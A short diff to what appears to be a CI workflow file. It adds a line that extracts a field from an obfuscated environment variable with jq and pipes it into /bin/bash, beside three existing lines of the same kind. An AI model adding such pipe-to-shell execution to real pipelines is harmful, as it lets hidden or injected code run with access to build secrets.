@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$h3762" | jq -r .fp957 | /bin/bash
           echo $mda43733 | jq -r .gvf74 | /bin/bash
           echo $dcobb0 | jq -r .wq4 | /bin/bash
+          printf '%s' "$t0" | jq -r .al314 | /bin/bash
 
       - name: Persist output
         if: always()
